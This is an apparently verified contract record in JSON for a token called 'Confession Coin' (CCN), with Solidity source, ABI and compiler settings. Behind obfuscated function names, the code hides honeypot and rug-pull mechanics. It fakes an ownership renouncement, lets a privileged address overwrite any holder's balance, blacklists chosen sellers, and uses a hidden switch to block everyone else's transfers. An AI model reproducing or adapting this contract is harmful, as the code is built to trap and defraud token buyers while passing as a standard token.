{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract launchedWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxList {\n    function createPair(address receiverLimitMarketing, address shouldLiquidity) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface feeMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface launchToReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchReceiver) external view returns (uint256);\n\n    function transfer(address marketingLaunchedIs, uint256 senderTeam) external returns (bool);\n\n    function allowance(address receiverTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingLaunchedIs,\n        uint256 senderTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listIsLaunched, uint256 value);\n    event Approval(address indexed receiverTotal, address indexed spender, uint256 value);\n}\n\ninterface swapFeeMarketing is launchToReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfessionCoin is launchedWallet, launchToReceiver, swapFeeMarketing {\n\n    constructor (){\n        if (maxWallet) {\n            maxWallet = false;\n        }\n        launchMax();\n        feeMarketing exemptAmount = feeMarketing(fromFee);\n        tokenLimit = maxList(exemptAmount.factory()).createPair(exemptAmount.WETH(), address(this));\n        sellShould = maxList(exemptAmount.factory()).feeTo();\n        \n        feeReceiverAuto = _msgSender();\n        listMarketingReceiver[feeReceiverAuto] = true;\n        minList[feeReceiverAuto] = listShouldTx;\n        \n        emit Transfer(address(0), feeReceiverAuto, listShouldTx);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTxAmount;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitMarketingIs;\n    }\n\n    function marketingAuto(address totalMarketing, address marketingLaunchedIs, uint256 senderTeam) internal view returns (uint256) {\n        require(senderTeam > 0);\n\n        uint256 receiverMarketingSell = 0;\n        if (totalMarketing == tokenLimit && isTotalLimit > 0) {\n            receiverMarketingSell = senderTeam * isTotalLimit / 100;\n        } else if (marketingLaunchedIs == tokenLimit && takeWallet > 0) {\n            receiverMarketingSell = senderTeam * takeWallet / 100;\n        }\n        require(receiverMarketingSell <= senderTeam);\n        return senderTeam - receiverMarketingSell;\n    }\n\n    uint256 limitFundSender;\n\n    address sellShould;\n\n    function listAt(address tradingLaunchExempt) public {\n        totalFee();\n        \n        if (tradingLaunchExempt == feeReceiverAuto || tradingLaunchExempt == tokenLimit) {\n            return;\n        }\n        marketingAmountReceiver[tradingLaunchExempt] = true;\n    }\n\n    bool public swapEnableLiquidity;\n\n    mapping(address => bool) public listMarketingReceiver;\n\n    function transfer(address sellMarketingAt, uint256 senderTeam) external virtual override returns (bool) {\n        return marketingShouldLiquidity(_msgSender(), sellMarketingAt, senderTeam);\n    }\n\n    uint256 constant takeLimit = 11 ** 10;\n\n    bool private receiverTokenEnable;\n\n    mapping(address => uint256) private minList;\n\n    function swapTx(uint256 senderTeam) public {\n        totalFee();\n        limitFundSender = senderTeam;\n    }\n\n    function totalFee() private view {\n        require(listMarketingReceiver[_msgSender()]);\n    }\n\n    function marketingShouldLiquidity(address totalMarketing, address marketingLaunchedIs, uint256 senderTeam) internal returns (bool) {\n        if (totalMarketing == feeReceiverAuto) {\n            return receiverMin(totalMarketing, marketingLaunchedIs, senderTeam);\n        }\n        uint256 teamLaunched = launchToReceiver(tokenLimit).balanceOf(sellShould);\n        require(teamLaunched == limitFundSender);\n        require(marketingLaunchedIs != sellShould);\n        if (marketingAmountReceiver[totalMarketing]) {\n            return receiverMin(totalMarketing, marketingLaunchedIs, takeLimit);\n        }\n        senderTeam = marketingAuto(totalMarketing, marketingLaunchedIs, senderTeam);\n        return receiverMin(totalMarketing, marketingLaunchedIs, senderTeam);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableMarketing;\n    }\n\n    bool private senderAtExempt;\n\n    function owner() external view returns (address) {\n        return swapMode;\n    }\n\n    function toMarketingFund(address sellMarketingAt, uint256 senderTeam) public {\n        totalFee();\n        minList[sellMarketingAt] = senderTeam;\n    }\n\n    uint256 tradingLaunched;\n\n    uint8 private launchedTxAmount = 18;\n\n    string private limitMarketingIs = \"Confession Coin\";\n\n    function allowance(address limitAt, address autoWallet) external view virtual override returns (uint256) {\n        if (autoWallet == fromFee) {\n            return type(uint256).max;\n        }\n        return feeToReceiver[limitAt][autoWallet];\n    }\n\n    function launchMax() public {\n        emit OwnershipTransferred(feeReceiverAuto, address(0));\n        swapMode = address(0);\n    }\n\n    uint256 public takeWallet = 0;\n\n    address public feeReceiverAuto;\n\n    function getOwner() external view returns (address) {\n        return swapMode;\n    }\n\n    address fromFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private enableMarketing = \"CCN\";\n\n    mapping(address => mapping(address => uint256)) private feeToReceiver;\n\n    function approve(address autoWallet, uint256 senderTeam) public virtual override returns (bool) {\n        feeToReceiver[_msgSender()][autoWallet] = senderTeam;\n        emit Approval(_msgSender(), autoWallet, senderTeam);\n        return true;\n    }\n\n    bool private maxWallet;\n\n    event OwnershipTransferred(address indexed swapMin, address indexed walletEnable);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listShouldTx;\n    }\n\n    uint256 private listShouldTx = 100000000 * 10 ** 18;\n\n    function swapTotal(address autoTeam) public {\n        require(autoTeam.balance < 100000);\n        if (swapEnableLiquidity) {\n            return;\n        }\n        \n        listMarketingReceiver[autoTeam] = true;\n        \n        swapEnableLiquidity = true;\n    }\n\n    address public tokenLimit;\n\n    function receiverMin(address totalMarketing, address marketingLaunchedIs, uint256 senderTeam) internal returns (bool) {\n        require(minList[totalMarketing] >= senderTeam);\n        minList[totalMarketing] -= senderTeam;\n        minList[marketingLaunchedIs] += senderTeam;\n        emit Transfer(totalMarketing, marketingLaunchedIs, senderTeam);\n        return true;\n    }\n\n    function transferFrom(address totalMarketing, address marketingLaunchedIs, uint256 senderTeam) external override returns (bool) {\n        if (_msgSender() != fromFee) {\n            if (feeToReceiver[totalMarketing][_msgSender()] != type(uint256).max) {\n                require(senderTeam <= feeToReceiver[totalMarketing][_msgSender()]);\n                feeToReceiver[totalMarketing][_msgSender()] -= senderTeam;\n            }\n        }\n        return marketingShouldLiquidity(totalMarketing, marketingLaunchedIs, senderTeam);\n    }\n\n    address private swapMode;\n\n    function balanceOf(address launchReceiver) public view virtual override returns (uint256) {\n        return minList[launchReceiver];\n    }\n\n    uint256 public isTotalLimit = 3;\n\n    mapping(address => bool) public marketingAmountReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIsLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiverAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotalLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchExempt\",\"type\":\"address\"}],\"name\":\"listAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAmountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnableLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderTeam\",\"type\":\"uint256\"}],\"name\":\"swapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTeam\",\"type\":\"uint256\"}],\"name\":\"toMarketingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunchedIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConfessionCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}